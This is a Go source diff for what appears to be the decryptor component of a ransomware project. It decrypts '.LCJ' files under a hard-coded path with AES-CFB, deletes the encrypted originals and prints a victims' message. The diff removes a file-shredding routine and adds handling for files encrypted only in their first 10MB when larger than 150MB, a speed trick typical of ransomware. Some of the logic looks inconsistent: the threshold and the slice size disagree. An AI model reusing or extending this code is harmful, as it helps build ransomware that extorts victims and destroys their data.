@@ -23,14 +23,11 @@ import (
 	"log"
 	"os"
 	"path/filepath"
-	"strings"
 	"time"
 )
 
-func init() {
-	//rand.Seed not working
-	//rand.Seed(time.Now().UnixNano())
-}
+var MB150 int = 157286400
+var key []byte
 
 // ========= GENERAL =========
 func Error(err error) (error){
@@ -40,87 +37,6 @@ func Error(err error) (error){
 	return nil
 }
 // ========= END GENERAL =========
-// ========= SHRED =========
-
-// Conf is a object containing all choices of the user
-type Conf struct {
-	Times  int
-	Zeros  bool
-	Remove bool
-}
-
-
-// Path shreds all files in the location of path
-// recursively. If remove is set to true files will be deleted
-// after shredding. When a file is shredded its content
-// is NOT recoverable so USE WITH CAUTION!!!
-
-func (conf Conf) Path(path string) error {
-	stats, err := os.Stat(path)
-	Error(err)
-
-	if stats.IsDir() {
-		return conf.Dir(path)
-	}
-
-	return conf.File(path)
-}
-
-// Dir overwrites every File in the location of path and everything in its subdirectories
-func (conf Conf) Dir(path string) error {
-	var chErrors []chan error
-
-	walkFn := func(path string, info os.FileInfo, err error) error {
-		Error(err)
-
-		if info.IsDir() {
-			return nil
-		}
-
-		chErr := make(chan error)
-		chErrors = append(chErrors, chErr)
-		go func() {
-			err := conf.File(path)
-			chErr <- err
-		}()
-
-		return nil
-	}
-
-	if err := filepath.Walk(path, walkFn); err != nil {
-		return err
-	}
-
-	for _, chErr := range chErrors {
-		if err := <-chErr; err != nil {
-			return err
-		}
-	}
-
-	return nil
-}
-
-// File overwrites a given File in the location of path
-func (conf Conf) File(path string) error {
-	for i := 0; i < conf.Times; i++ {
-		if err := overwriteFile(path, true); err != nil {
-			return err
-		}
-	}
-
-	if conf.Zeros {
-		if err := overwriteFile(path, false); err != nil {
-			return err
-		}
-	}
-
-	if conf.Remove {
-		var err = os.Remove(path)
-		if err!=nil { return err }
-	}
-
-	return nil
-}
 
 func overwriteFile(path string, random bool) error {
 	f, err := os.OpenFile(path, os.O_WRONLY, 0)
@@ -143,11 +59,8 @@ func overwriteFile(path string, random bool) error {
 	_, err = f.WriteAt(buff, 0)
 	return err
 }
-
-// ========= END SHRED =========
-
 // ========= ENCRYPT =========
-var key []byte
+
 /////////////////////
 
 func ParseRsaPrivateKeyFromPemStr(privPEM string) (*rsa.PrivateKey, error) {
@@ -274,38 +187,49 @@ func decryptFile(inputfile string, outputfile string) {
 	}
 }
 
-func decodeBase64(b []byte) []byte {
+func decodeBase64(b, unecrypted_text []byte, above_150MB bool) []byte {
 	data, err := base64.StdEncoding.DecodeString(string(b))
 	if err != nil {
 		fmt.Printf("Error: Bad Key!\n")
 		os.Exit(0)
 	}
+	if above_150MB {
+		return append(data, unecrypted_text...)
+	}
 	return data
 }
-var MB150 int = 157286400
+
 func decrypt(key, text []byte) []byte {
+
 	block, err := aes.NewCipher(key)
 	Error(err)
-	//var above bool = false // edode : if file size is above 950 MB
-	//var not_ciphered_text []byte
-	//
-	//if err != nil {
-	//	panic(err)
-	//}
-	//if len(text) > MB150 { // edode : if the size of the file is superior to 150MB
-	//	text	     	  = text[:MB150]
-	//	not_ciphered_text = text[MB150:]
-	//	above = true
-	//}
-	if len(text) < aes.BlockSize {
+
+	var above_150MB = false
+	var not_ciphered_text, ciphered_text, iv []byte
+
+	if len(text) > MB150 {
+		ciphered_text	  = text[:10485760]
+		not_ciphered_text = text[10485760:]
+		above_150MB = true
+	}
+
+	if len(text) < aes.BlockSize { // lisandro : try with blank file
 		fmt.Printf("Error!\n")
 		os.Exit(0)
 	}
-	iv := text[:aes.BlockSize]
-	text = text[aes.BlockSize:]
+
+	if above_150MB {
+		iv 	 = ciphered_text[:aes.BlockSize]
+		text = ciphered_text[aes.BlockSize:]
+	} else {
+		iv 	 = text[:aes.BlockSize]
+		text = text[aes.BlockSize:]
+	}
+
 	cfb := cipher.NewCFBDecrypter(block, iv)
 	cfb.XORKeyStream(text, text)
-	return decodeBase64(text)
+	if above_150MB { return decodeBase64(text, not_ciphered_text, above_150MB)}
+	return decodeBase64(text, nil, false)
 }
 
 // ========= END ENCRYPT =========
@@ -324,15 +248,10 @@ func listdir(path string)([]string){
 	return fileList;
 }
 
-func remove_to_index(s []string, index int) []string {
-	return append(s[index:len(s)], s[len(s):]...)
-}
-
 func is_dir(path string)(bool){
 	name := path
 	fi, err := os.Stat(name)
 	if err != nil {
-		fmt.Println(err)
 		return false
 	}
 	switch mode := fi.Mode(); {
@@ -344,22 +263,6 @@ func is_dir(path string)(bool){
 	return false
 }
 
-func is_windows(file string)(){
-	s := strings.Split(file, "/")
-	if (s[len(s)-1] == "Windows"){
-		fileList := listdir(file)
-		for _, f := range fileList {
-			s1 := strings.Split(f, "/")
-			if (s1[len(s)-1] == "System32"){ // 19111999 :
-
-			}
-		}
-	} else{
-		return;
-	}
-	//fmt.Println(s[len(s)-1])
-}
-
 func pass()(){
 	_ = ""
 }
@@ -367,12 +270,9 @@ func pass()(){
 func tree(path string)(){
 	file_list := listdir(path)
 
-	shredconf := Conf{Times: 1, Zeros: false, Remove: true}
 	start := time.Now()
 	for _, file := range file_list {
-		//fmt.Printf(file)
 		if is_dir(file){
-			file_list = remove_to_index(file_list, 1)
 			continue
 		}
 		if file[len(file)-4:] != ".LCJ"{
@@ -380,8 +280,10 @@ func tree(path string)(){
 		}
 
 		decryptFile(file, file[:len(file)-4])
-		shredconf.Path(file)
-		file_list = remove_to_index(file_list, 1)
+		err := os.Remove(file)
+		if err!=nil {
+			continue
+		}
 	}
 	elapsed := time.Since(start)
 	fmt.Println("All of your files has been decrypted")
@@ -392,7 +294,6 @@ func main() {
 	check_key()
 	path := "/root/y"
 	tree(path)
-	//tree(path, false)
 }
 
 
